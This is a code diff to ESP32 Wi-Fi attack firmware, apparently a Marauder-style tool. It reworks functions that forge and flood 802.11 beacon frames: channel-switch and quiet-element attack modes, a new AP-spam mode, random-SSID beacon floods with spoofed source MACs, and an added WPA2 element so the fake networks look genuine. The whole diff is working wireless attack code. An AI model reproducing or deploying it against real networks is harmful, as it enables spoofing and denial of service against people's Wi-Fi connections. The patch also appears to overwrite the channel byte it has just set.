@@ -8806,7 +8806,6 @@ void WiFiScan::beaconListSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t 
 }
 
 void WiFiScan::broadcastCustomBeacon(uint32_t current_time, AccessPoint custom_ssid, int scan_mode) {
-  int post_ssid_len = 12;
   uint8_t target_channel = custom_ssid.channel;
 
   #ifndef HAS_DUAL_BAND
@@ -8816,7 +8815,6 @@ void WiFiScan::broadcastCustomBeacon(uint32_t current_time, AccessPoint custom_s
   #endif
   if (scan_mode == WIFI_ATTACK_CSA) {
     set_channel = custom_ssid.channel;
-    post_ssid_len = 18;
     while (target_channel == custom_ssid.channel) {
       #ifndef HAS_DUAL_BAND
         target_channel = random(1,15);
@@ -8825,15 +8823,17 @@ void WiFiScan::broadcastCustomBeacon(uint32_t current_time, AccessPoint custom_s
       #endif
     }
   } else if (scan_mode == WIFI_ATTACK_QUIET) {
-    post_ssid_len = 44;
+    set_channel = custom_ssid.channel;
+  } else if (scan_mode == WIFI_ATTACK_AP_SPAM) {
     set_channel = custom_ssid.channel;
   }
+
   this->changeChannel(this->set_channel);
   delay(1);  
 
   if ((scan_mode != WIFI_ATTACK_CSA) &&
       (scan_mode != WIFI_ATTACK_QUIET)) {
-    packet[10] = packet[16] = random(256);
+    packet[10] = packet[16] = (random(256) & 0xFE) | 0x02;
     packet[11] = packet[17] = random(256);
     packet[12] = packet[18] = random(256);
     packet[13] = packet[19] = random(256);
@@ -8877,7 +8877,9 @@ void WiFiScan::broadcastCustomBeacon(uint32_t current_time, AccessPoint custom_s
 
   static const uint8_t post_base[] = {
     0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c,
-    0x03, 0x01, 0x04
+    0x03, 0x01, 0x04, 0x30, 0x18, 0x01, 0x00, 0x00, 0x0f, 0xac, 
+    0x02, 0x02, 0x00, 0x00, 0x0f, 0xac, 0x04, 0x00, 0x0f, 0xac, 
+    0x04, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x02, 0x00, 0x00
   };
 
   static const uint8_t post_csa[] = {
@@ -8951,14 +8953,27 @@ void WiFiScan::broadcastCustomBeacon(uint32_t current_time, ssid custom_ssid) {
   
   packet[50 + fullLen] = set_channel;
 
-  uint8_t postSSID[13] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, //supported rate
-                          0x03, 0x01, 0x04 /*DSSS (Current Channel)*/ };
+  const uint8_t* post = nullptr;
+
+  static const uint8_t post_base[] = {
+    0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c,
+    0x03, 0x01, 0x04, 0x30, 0x18, 0x01, 0x00, 0x00, 0x0f, 0xac, 
+    0x02, 0x02, 0x00, 0x00, 0x0f, 0xac, 0x04, 0x00, 0x0f, 0xac, 
+    0x04, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x02, 0x00, 0x00
+  };
+
+  int post_len = sizeof(post_base);
+
+  memcpy(packet + (38 + fullLen), post_base, post_len);
+
+  /*uint8_t postSSID[13] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, //supported rate
+                          0x03, 0x01, 0x04 };
 
 
 
   // Add everything that goes after the SSID
   for(int i = 0; i < 12; i++) 
-    packet[38 + fullLen + i] = postSSID[i];
+    packet[38 + fullLen + i] = postSSID[i];*/
   
 
   esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
@@ -9020,6 +9035,8 @@ void WiFiScan::broadcastSetSSID(uint32_t current_time, const char* ESSID) {
 
 // Function for sending crafted beacon frames
 void WiFiScan::broadcastRandomSSID(uint32_t currentTime) {
+  int ssidLen = random(1, 33);
+  int fullLen = ssidLen;
 
   #ifndef HAS_DUAL_BAND
     set_channel = random(1,12); 
@@ -9030,38 +9047,33 @@ void WiFiScan::broadcastRandomSSID(uint32_t currentTime) {
   delay(1);  
 
   // Randomize SRC MAC
-  packet[10] = packet[16] = random(256);
+  packet[10] = packet[16] = (random(256) & 0xFE) | 0x02;
   packet[11] = packet[17] = random(256);
   packet[12] = packet[18] = random(256);
   packet[13] = packet[19] = random(256);
   packet[14] = packet[20] = random(256);
   packet[15] = packet[21] = random(256);
 
-  packet[37] = 6;
+  packet[37] = ssidLen;
   
+  for (int i = 0; i < ssidLen; i++)
+    packet[38 + i] = alfa[random(65)];
   
-  // Randomize SSID (Fixed size 6. Lazy right?)
-  packet[38] = alfa[random(65)];
-  packet[39] = alfa[random(65)];
-  packet[40] = alfa[random(65)];
-  packet[41] = alfa[random(65)];
-  packet[42] = alfa[random(65)];
-  packet[43] = alfa[random(65)];
-  
-  packet[56] = set_channel;
+  packet[50 + fullLen] = set_channel;
 
-  uint8_t postSSID[13] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, //supported rate
-                      0x03, 0x01, 0x04 /*DSSS (Current Channel)*/ };
+  static const uint8_t post_base[] = {
+    0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c,
+    0x03, 0x01, 0x04, 0x30, 0x18, 0x01, 0x00, 0x00, 0x0f, 0xac, 
+    0x02, 0x02, 0x00, 0x00, 0x0f, 0xac, 0x04, 0x00, 0x0f, 0xac, 
+    0x04, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x02, 0x00, 0x00
+  };
 
+  int post_len = sizeof(post_base);
 
+  memcpy(packet + (38 + fullLen), post_base, post_len);
 
-  // Add everything that goes after the SSID
-  for(int i = 0; i < 12; i++) 
-    packet[38 + 6 + i] = postSSID[i];
-
-  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
-  //ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false));
-  //ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false));
+  for (int i = 0; i < 3; i++)
+    esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
 
   packets_sent = packets_sent + 3;
 }
